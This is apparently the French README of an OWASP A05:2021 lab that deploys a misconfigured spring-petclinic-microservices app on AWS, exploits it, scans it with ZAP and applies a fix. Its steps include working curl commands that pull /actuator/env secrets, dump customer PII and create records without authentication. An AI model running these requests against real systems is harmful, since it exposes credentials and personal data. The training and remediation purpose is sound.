# OWASP A05:2021 — Security Misconfiguration Challenge

## Vulnérabilité : A05:2021 Security Misconfiguration

**A05:2021** couvre les cas où une application est mal configurée au niveau sécurité,
exposant des fonctionnalités, des données ou des mécanismes non prévus pour l'accès public.

### Pourquoi cette vulnérabilité s'applique à spring-petclinic-microservices

`spring-petclinic-microservices` est une application de démonstration Spring Boot qui,
dans sa configuration par défaut :

1. **Expose tous les endpoints Actuator** (`/actuator/*`) sans authentification, incluant
   `/actuator/env` (variables d'environnement), `/actuator/beans` (composants internes),
   `/actuator/heapdump` (dump mémoire complet).

2. **N'applique aucune restriction d'accès** sur ses endpoints REST métier, permettant
   des opérations CRUD sans vérification d'identité.

3. **Ne configure aucun header de sécurité HTTP**, rendant l'application vulnérable au
   clickjacking (absence de `X-Frame-Options`) et aux injections XSS
   (absence de `Content-Security-Policy`).

---

## Les 3 vecteurs d'attaque identifiés

### Vecteur 1 — Divulgation d'informations via Spring Actuator
```
GET /actuator/env        → Variables d'environnement (mots de passe, tokens)
GET /actuator/beans      → Architecture interne Spring
GET /actuator/mappings   → Carte complète des routes HTTP
```

### Vecteur 2 — Accès non authentifié aux données métier
```
GET  /api/customer/owners       → Exfiltration de PII (données personnelles)
POST /api/customer/owners       → Création sans authentification
PUT  /api/customer/owners/{id}  → Modification sans autorisation
```

### Vecteur 3 — Absence de headers de sécurité HTTP
```
X-Frame-Options         → absent → clickjacking possible
Content-Security-Policy → absent → XSS persistant possible
X-Content-Type-Options  → absent → MIME sniffing possible
```

---

## Étapes pour reproduire

### Prérequis

- AWS CLI configuré (`aws configure`)
- Terraform >= 1.5
- Git, curl, python3

### 1. Déployer l'infrastructure

```bash
cd infra-owasp/infra
terraform init
terraform apply -auto-approve
```

Notez l'IP publique affichée dans les outputs :
```
public_ip = "X.X.X.X"
export TARGET=<IP>
```

> Le démarrage complet de l'application prend ~10-15 minutes (build Maven inclus).

### 2. Attendre que l'application soit prête

```bash
until curl -sf http://$TARGET:8080/actuator/health; do
  echo "En attente..."; sleep 15
done
```

### 3. Exploiter la vulnérabilité

```bash
# Extraction des variables d'environnement
curl -s http://$TARGET:8080/actuator/env | python3 -m json.tool

# Exfiltration des données clients
curl -s http://$TARGET:8080/api/customer/owners | python3 -m json.tool

# Création sans authentification
curl -s -X POST http://$TARGET:8080/api/customer/owners \
  -H "Content-Type: application/json" \
  -d '{"firstName":"Attacker","lastName":"Test","address":"1337 St","city":"CyberCity","telephone":"0000000000"}'
```

### 4. Scanner avec OWASP ZAP

```bash
# Configurer le secret GitHub
gh secret set ZAP_TARGET --body "$TARGET"

# Déclencher le scan
gh workflow run zap-scan.yml

# Télécharger le rapport depuis l'onglet Actions > Artifacts
```

### 5. Appliquer la correction

Copier `SecurityConfig.java` et `application-security.yml` dans le projet API Gateway,
rebuilder et redéployer. Consulter `report/fix_explanation.md` pour les détails.

---

## Structure du dépôt

```
infra-owasp/
├── infra/
│   ├── main.tf                    # Infrastructure EC2 Terraform
│   ├── variables.tf
│   ├── outputs.tf
│   └── user_data.sh               # Bootstrap Docker + clone + run
├── .github/workflows/
│   └── zap-scan.yml               # OWASP ZAP Full Scan CI
├── report/
│   ├── attack_analysis.md         # Analyse détaillée des vecteurs
│   └── fix_explanation.md         # Before/after de la correction
├── spring-petclinic-api-gateway/
│   └── src/main/
│       ├── java/.../SecurityConfig.java
│       └── resources/application-security.yml
└── README.md
```

---

## Références

- [OWASP Top 10 — A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [Spring Boot Actuator Security](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security)
- [CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)
